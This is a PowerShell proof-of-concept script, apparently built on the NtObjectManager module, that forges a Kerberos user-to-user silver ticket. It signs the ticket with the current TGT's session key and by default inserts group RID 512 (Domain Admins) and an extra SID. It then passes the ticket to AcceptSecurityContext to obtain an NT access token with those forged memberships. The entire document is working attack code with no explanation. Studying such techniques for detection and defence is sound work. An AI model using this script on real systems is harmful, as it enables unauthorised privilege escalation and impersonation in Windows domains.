# U2U silver ticket
param(
    [uint32[]]$GroupId = 512,
    [string[]]$ExtraSid = (Get-NtSid -IntegrityLevel Medium),
    [switch]$Format,
    [switch]$Limited
)

. "$PSScriptRoot\common.ps1"

try {
    # Setup general variables.
    $realm = (Get-WMIObject Win32_ComputerSystem).Domain.ToUpper()
    $sid = Get-NtSid
    $username = (Get-NtSidName $sid).Name
    $name = New-KerberosPrincipalName -Name $username -Type PRINCIPAL

    # Get a TGT with a session key and build a U2U silver ticket.
    Remove-KerberosTicket -All
    $tgt = Get-UserTgt
    $session_key = $tgt.ToExternalTicket().SessionKey
    $cred = New-KerberosSilverTicket -Key $session_key -ServerName $name -ClientName $name -Realm $realm -UserSid $sid -Format:$Format -GroupId $GroupId -ExtraSid $ExtraSid -Limited:$Limited

    # Create a non-LSA client context, doesn't call InitializeSecurityContext.
    $client = New-LsaClientContext -Ticket $cred -RequestAttribute UseSessionKey
    if ($Format) {
        Format-LsaAuthToken $client | Out-Host
    }

    # Ensure TGT is cache.
    Remove-KerberosTicket -All
    Add-KerberosTicket -Credential $tgt

    # Submit AP-REQ with U2U silver ticket to AcceptSecurityContext.
    Use-NtObject($cred_handle = New-LsaCredentialHandle -Package 'Kerberos' -UseFlag Inbound) {
        Use-NtObject($server = New-LsaServerContext -CredHandle $cred_handle) {
            Update-LsaServerContext $server $client

            # Get NT access token.
            Get-LsaAccessToken $server
        }
    }
} catch {
    Write-Error $_
}